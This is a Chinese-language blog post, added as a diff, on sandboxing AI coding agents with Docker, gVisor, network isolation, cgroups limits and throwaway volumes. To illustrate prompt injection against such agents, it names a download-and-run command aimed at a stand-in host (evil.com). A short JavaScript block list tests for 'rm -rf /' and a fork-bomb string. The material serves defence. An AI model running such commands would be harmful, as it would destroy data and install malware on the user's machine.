@@ -1,0 +1,45 @@
+---
+title: "Code Agent 安全沙盒构建：Docker 与 gVisor 容器强隔离防御工程"
+excerpt: "全面拆解 AI 自动写代码并执行场景下的系统安全体系：如何防范 rm -rf、提权攻击、局域网内网穿透与恶意依赖注入。"
+date: "2026-08-20"
+updated: "2026-10-13"
+tags: ["安全沙盒","Docker","gVisor","系统安全"]
+cover: "/images/blog-covers/ai-security.webp"
+featured: false
+status: published
+ragReady: true
+views: 0
+likes: 0
+---
+
+## 赋予大模型终端执行权限的巨大风险
+
+当开发者使用 AI 编码助手并开启“自动运行测试或安装依赖”时，系统的攻击面被无限放大：
+- 模型可能被提示词注入诱导执行 `curl evil.com/malware.sh | bash`；
+- 执行包含恶意后门的 npm/pip 依赖包；
+- 误操作递归删除主机的系统关键目录。
+
+生产级 AI 编码平台必须拥有不可突破的**硬件/内核级安全沙盒（Sandbox）**。
+
+## 纵深防御架构：gVisor 用户态内核与只读文件系统
+
+构建企业级安全沙盒的四道防线：
+1. **用户态内核隔离 (gVisor / Firecracker microVM)**：不直接让代码接触宿主机 Linux 内核，由 gVisor 截获并重新实现所有系统调用，杜绝内核提权利用；
+2. **网络命名空间黑名单 (Network Sandbox)**：执行代码时强制关闭外部网络访问，或仅开放特定受信任的软件源镜像站；
+3. **严格资源配额 (cgroups Limits)**：限制单进程最大 CPU 核心、1GB 内存上限与 10 秒超时强行 SIGKILL，防止死循环 Fork 炸弹拖垮宿主机；
+4. **即用即毁的临时只读卷**：代码运行完毕后，整个容器层直接抛弃，数据零残留。
+
+## 危险指令正则安全拦截断言
+
+```js
+import assert from "node:assert/strict";
+function isSafeCommand(cmd) {
+  return !cmd.includes("rm -rf /") && !cmd.includes(":(){:|:&};:");
+}
+assert.equal(isSafeCommand("npm test"), true);
+assert.equal(isSafeCommand("rm -rf /"), false);
+```
+
+## 原始资料与溯源链接
+
+- [gVisor Application Kernel for Containers](https://gvisor.dev/)：Google 官方开源安全沙盒架构指南。
